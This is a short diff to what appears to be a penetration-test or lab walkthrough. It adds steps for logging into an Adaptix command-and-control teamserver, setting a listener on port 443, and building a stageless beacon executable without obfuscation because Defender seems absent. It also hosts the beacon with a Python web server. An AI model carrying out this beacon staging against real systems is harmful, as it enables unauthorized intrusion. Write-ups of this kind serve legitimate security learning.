@@ -602,7 +602,14 @@ Then ill export it
 
 The next thing ill do is start up adaptix and get logged in to the teamserver
 
-From there ill set a listener 
+From there ill set a listener on port 443 and generate a stagless exe, shouldnt have to worry about obfuscation as i dont think defender is running
+
+```python
+python3 -m http.server 9000
+Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
+```
+
+Ill then start up a web server to host the beacon
 
 ```python
 
